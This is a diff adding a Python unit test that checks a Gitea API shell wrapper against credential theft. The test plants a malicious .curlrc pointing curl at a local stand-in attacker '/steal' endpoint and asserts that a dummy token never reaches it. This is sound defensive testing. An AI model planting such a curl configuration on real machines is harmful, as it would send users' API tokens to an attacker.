@@ -6,7 +6,9 @@ import stat
 import subprocess
 import tempfile
 import textwrap
+import threading
 import unittest
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
 
 
@@ -20,13 +22,16 @@ FUNCTION = re.compile(
 class GiteaAPIWrapperTests(unittest.TestCase):
     def wrappers(self) -> set[str]:
         snippets = set()
+        prompts = []
         for prompt in (ROOT / "dev-lead").rglob("*.md"):
             text = prompt.read_text(encoding="utf-8")
             if "gitea_api() (" not in text:
                 continue
+            prompts.append(prompt)
             function = FUNCTION.search(text)
             self.assertIsNotNone(function, prompt)
             snippets.add(textwrap.dedent(function.group(0)))
+        self.assertEqual(len(prompts), 53, "the imported wrapper inventory changed")
         return snippets
 
     @staticmethod
@@ -94,6 +99,7 @@ class GiteaAPIWrapperTests(unittest.TestCase):
             self.assertNotIn(sentinel, argv_log.read_text())
             self.assertNotIn(sentinel, result.stdout + result.stderr)
             argv = argv_log.read_text()
+            self.assertEqual(argv.splitlines()[0], "<-q>")
             self.assertIn("<POST>", argv)
             self.assertIn("<--data-binary>", argv)
             self.assertIn(
@@ -149,6 +155,84 @@ class GiteaAPIWrapperTests(unittest.TestCase):
             self.assertFalse(call_log.exists(), "curl ran for a rejected request")
             self.assertNotIn(sentinel, result.stdout + result.stderr)
             self.assertNotIn("attacker.invalid", (root / "argv.log").read_text() if (root / "argv.log").exists() else "")
+
+    def test_wrapper_ignores_malicious_default_curlrc_with_real_curl(self) -> None:
+        snippets = self.wrappers()
+        self.assertEqual(len(snippets), 1)
+        snippet = snippets.pop()
+        target_requests: list[tuple[str, str | None]] = []
+        attacker_requests: list[tuple[str, str | None]] = []
+
+        def serve(records: list[tuple[str, str | None]]):
+            class Handler(BaseHTTPRequestHandler):
+                def do_GET(self) -> None:
+                    records.append((self.path, self.headers.get("Authorization")))
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_header("Content-Length", "2")
+                    self.end_headers()
+                    self.wfile.write(b"{}")
+
+                def log_message(self, _format: str, *_args: object) -> None:
+                    return
+
+            server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
+            thread = threading.Thread(target=server.serve_forever, daemon=True)
+            thread.start()
+            return server, thread
+
+        target, target_thread = serve(target_requests)
+        attacker, attacker_thread = serve(attacker_requests)
+        try:
+            with tempfile.TemporaryDirectory() as directory:
+                root = Path(directory)
+                target_base = f"http://127.0.0.1:{target.server_port}/api/v1/"
+                local_snippet = snippet.replace(
+                    "https://git.moleculesai.app/api/v1/", target_base
+                )
+                (root / ".curlrc").write_text(
+                    f'url = "http://127.0.0.1:{attacker.server_port}/steal"\n',
+                    encoding="utf-8",
+                )
+                script = root / "real-curl.sh"
+                script.write_text(
+                    local_snippet
+                    + "\ngitea_api GET 'repos/molecule-ai/internal'\n",
+                    encoding="utf-8",
+                )
+                sentinel = "dummy-api-token-must-not-leak"
+                env = os.environ.copy()
+                env.update(
+                    HOME=str(root),
+                    CURL_HOME=str(root),
+                    GITEA_TOKEN=sentinel,
+                    NO_PROXY="127.0.0.1",
+                    no_proxy="127.0.0.1",
+                )
+
+                result = subprocess.run(
+                    ["bash", "-x", str(script)],
+                    text=True,
+                    capture_output=True,
+                    env=env,
+                    timeout=10,
+                    check=False,
+                )
+
+                self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
+                self.assertEqual(
+                    target_requests,
+                    [("/api/v1/repos/molecule-ai/internal", f"token {sentinel}")],
+                )
+                self.assertEqual(attacker_requests, [])
+                self.assertNotIn(sentinel, result.stdout + result.stderr)
+        finally:
+            target.shutdown()
+            attacker.shutdown()
+            target.server_close()
+            attacker.server_close()
+            target_thread.join(timeout=5)
+            attacker_thread.join(timeout=5)
 
 
 if __name__ == "__main__":
